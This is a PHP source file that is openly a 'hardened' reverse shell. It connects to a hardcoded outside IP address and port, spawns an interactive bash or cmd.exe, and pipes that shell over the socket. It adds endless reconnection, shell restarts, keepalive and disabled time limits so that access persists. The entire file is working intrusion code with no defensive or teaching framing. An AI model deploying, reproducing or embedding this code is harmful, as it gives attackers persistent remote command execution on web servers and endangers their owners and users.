<?php
// hardened revshell — retries, keepalive, socket reuse, no timeouts
$ip = '176.65.132.38';
$port = 2026;

ignore_user_abort(true);
set_time_limit(0);

// retry logic — keep trying forever
while (true) {
    $sock = @fsockopen($ip, $port, $errno, $errstr, 10);
    if ($sock) {
        // socket alive — proceed
        break;
    }
    // wait before retry (exponential backoff)
    sleep(5);
}

// set socket options: keepalive, timeout
stream_set_timeout($sock, 0, 200000); // 200ms micro timeout
stream_set_blocking($sock, false);

// set TCP keepalive if available (Linux)
if (function_exists('socket_import_stream')) {
    $socket = socket_import_stream($sock);
    @socket_set_option($socket, SOL_SOCKET, SO_KEEPALIVE, 1);
    @socket_set_option($socket, SOL_TCP, TCP_KEEPIDLE, 30);
    @socket_set_option($socket, SOL_TCP, TCP_KEEPINTVL, 10);
    @socket_set_option($socket, SOL_TCP, TCP_KEEPCNT, 5);
}

$descriptors = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w'],
];

$cmd = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'cmd.exe' : '/bin/bash -i';
$process = @proc_open($cmd, $descriptors, $pipes);

if (!is_resource($process)) {
    fclose($sock);
    // fallback: try /bin/sh without -i
    $cmd = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'cmd.exe' : '/bin/sh';
    $process = @proc_open($cmd, $descriptors, $pipes);
    if (!is_resource($process)) {
        die("[-] proc_open failed — check disable_functions\n");
    }
}

stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);

$last_heartbeat = time();

while (true) {
    $status = proc_get_status($process);
    if (!$status['running']) {
        // process died — restart it
        proc_close($process);
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (!is_resource($process)) break;
        stream_set_blocking($pipes[0], false);
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);
        continue;
    }

    // check socket health
    $meta = stream_get_meta_data($sock);
    if (feof($sock) || $meta['timed_out']) {
        // socket dead — reconnect
        fclose($sock);
        while (true) {
            $sock = @fsockopen($ip, $port, $errno, $errstr, 10);
            if ($sock) {
                stream_set_timeout($sock, 0, 200000);
                stream_set_blocking($sock, false);
                break;
            }
            sleep(5);
        }
        continue;
    }

    $read = [$sock, $pipes[1], $pipes[2]];
    $write = null;
    $except = null;

    // 1 second select — avoid busy loop
    if (@stream_select($read, $write, $except, 1) === false) {
        // select error — check socket
        continue;
    }

    foreach ($read as $stream) {
        if ($stream === $sock) {
            $input = fread($sock, 4096);
            if ($input !== false && $input !== '') {
                fwrite($pipes[0], $input);
                fflush($pipes[0]);
            } elseif ($input === '') {
                // remote closed connection
                break 2;
            }
        } elseif ($stream === $pipes[1]) {
            $output = fread($pipes[1], 4096);
            if ($output !== false && $output !== '') {
                fwrite($sock, $output);
            }
        } elseif ($stream === $pipes[2]) {
            $error = fread($pipes[2], 4096);
            if ($error !== false && $error !== '') {
                fwrite($sock, $error);
            }
        }
    }

    // optional: send heartbeat every 60s to keep NAT alive
    if (time() - $last_heartbeat > 60) {
        @fwrite($sock, "\n"); // ping
        $last_heartbeat = time();
    }
}

// clean up
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
fclose($sock);
?>
